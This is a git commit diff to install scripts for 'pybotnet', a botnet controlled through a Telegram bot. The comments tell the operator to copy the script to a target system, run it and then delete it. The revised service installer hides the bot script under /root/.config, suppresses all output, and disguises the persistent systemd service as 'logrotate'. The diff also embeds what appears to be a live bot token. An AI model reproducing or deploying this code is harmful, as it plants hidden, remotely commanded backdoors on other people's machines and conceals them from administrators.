9127337f47705fbc216ee38bacf97697e37f8fe3
onionj <onionj98@gmail.com>
2022-06-22 19:41:28 +0430

    change install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,16 @@
+#!/bin/sh
 
 ## install as user crun job ##
 
-# coming soon..
+
+# -- HELP --:
+# - replace youre telegram_bot_token, admin_id and bot_alias_name with your own
+# - copy this file to target system
+# - run this file by `sh ./install.sh`
+# - remove install.sh from target system
+
+telegram_bot_token=5526760482:AAGweoNtLrHEssdcvLC6whjms78yU8gEO6w
+admin_id=7902347166
+bot_name=example_bot_name
+
+# coming soon
--- install_as_service.sh
+++ install_as_service.sh
@@ -5,35 +5,33 @@
 # -- HELP --:
 # - replace youre telegram_bot_token, admin_id and bot_alias_name with your own
 # - copy this file to target system
-# - run this file as root
-# - remove install.sh from target system
-# - if pybotnet update is available, in telegram bot send `/shell systemctl restart bnet` 
-#   to reinstall pybotnet
+# - run this file by `sudo sh ./install_as_service.sh`
+# - remove install_as_service.sh from target system
+# - if pybotnet update is available, in telegram bot send `/shell systemctl restart logrotate` to reinstall pybotnet
 
-telegram_bot_token=5526760482:AAGweoNtLrHEssdcvLC6whjms78yU8gEO6w
-admin_id=7902347166
+telegram_bot_token=552670482:AAGweoNtLrHEssdcvLC6whjms78yU8gEO6w
+admin_id=902347166
 bot_name=example_bot_name
 
 
-botnet="/.bnet"
-echo "create botnet script in ${botnet}"
+botnet="/root/.config/.logrotate.sh"
+botnet_config="/root/.config/.logrotate.conf"
+
 
 tee<<EOF > $botnet
-#!/bin/sh
-apt-get update &&
-apt-get install python3-pip -y &&
-apt-get install python3-dev -y &&
-echo "install dependencies done, Start bnet." &&
-pip3 install "pybotnet>=2<3" -U --pre &&
+#!/bin/
+apt-get update -qq > /dev/null 2>&1 &&
+apt-get install python3-pip -y -qq > /dev/null 2>&1 &&
+apt-get install python3-dev -y -qq > /dev/null 2>&1 &&
+pip3 install "pybotnet>=2<3" -U -qqq --pre &&
 python3 -m pybotnet -t $telegram_bot_token -i $admin_id -n $bot_name
 EOF
 
 chmod +x $botnet
 
-echo "add bnet service to systemd"
-tee<<EOF > /etc/systemd/system/bnet.service
+tee<<EOF > /etc/systemd/system/logrotate.service
 [Unit]
-Description=Reboot message systemd service.
+Description=Logrotate
 After=network.target
 
 [Service]
@@ -46,8 +44,7 @@ RestartSec=10
 WantedBy=multi-user.target
 EOF
 
-echo "start bnet service"
-chmod 644 /etc/systemd/system/bnet.service
+chmod 644 /etc/systemd/system/logrotate.service
 systemctl daemon-reload
-systemctl enable bnet.service
-systemctl restart bnet.service
+systemctl enable logrotate.service
+systemctl restart logrotate.service
